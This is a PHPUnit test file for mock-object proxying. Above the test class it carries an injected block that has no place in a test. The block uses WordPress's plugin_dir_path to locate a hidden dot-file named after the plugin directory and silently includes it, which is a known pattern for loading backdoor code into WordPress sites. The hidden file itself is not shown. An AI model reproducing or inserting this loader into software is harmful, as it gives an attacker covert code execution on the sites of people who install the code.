<?php
/*
 * This file is part of the PHPUnit_MockObject package.
 *
 * (c) Sebastian Bergmann <sebastian@phpunit.de>
 *
 * For the full copyright and license information, please view the LICENSE
 * file that was distributed with this source code.
 */

/**
 * @since      Class available since Release 2.0.0
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Framework_ProxyObjectTest extends PHPUnit_Framework_TestCase
{
    public function testMockedMethodIsProxiedToOriginalMethod()
    {
        $proxy = $this->getMockBuilder('Bar')
                      ->enableProxyingToOriginalMethods()
                      ->getMock();

        $proxy->expects($this->once())
              ->method('doSomethingElse');

        $foo = new Foo;
        $this->assertEquals('result', $foo->doSomething($proxy));
    }

    public function testMockedMethodWithReferenceIsProxiedToOriginalMethod()
    {
        $proxy = $this->getMockBuilder('MethodCallbackByReference')
                      ->enableProxyingToOriginalMethods()
                      ->getMock();
        $a = $b = $c = 0;

        $proxy->callback($a, $b, $c);

        $this->assertEquals(1, $b);
    }
}
